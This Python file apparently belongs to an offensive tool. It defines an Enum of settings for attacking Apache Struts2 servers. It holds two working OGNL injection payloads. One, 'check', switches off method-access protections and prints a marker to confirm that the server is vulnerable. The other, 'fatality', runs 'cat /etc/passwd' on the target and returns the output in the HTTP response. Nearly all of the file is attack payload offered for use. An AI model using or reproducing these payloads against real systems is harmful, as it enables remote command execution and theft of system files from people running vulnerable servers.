from enum import Enum
import socket


class Struts2Enum(Enum):

    """ Enums for Struts2 """

    ip = socket.gethostbyname(socket.gethostname())
    file_type = "action"
    server_port = "8000"
    http = 80
    https = 443
    param = "?foo="

    check = ("%{(#_memberAccess['allowStaticMethodAccess']=true)"
             "(#context['xwork.MethodAccessor.denyMethodExecution']=false)"
             "(#pwn=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
             "#pwn.println('<slither>pwn</slither>'),#pwn.close())}")

    fatality = ("%{(#_memberAccess['allowStaticMethodAccess']=true)"
                "(#context['xwork.MethodAccessor.denyMethodExecution']=false)"
                "(#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),"
                "#b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b)," ''
                "#d=new java.io.BufferedReader(#c), #e=new char[5000], #d.read(#e),"
                "#slither=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),"
                "#slither.getWriter().println(#e), #slither.getWriter().flush(), #slither.getWriter().close())}")

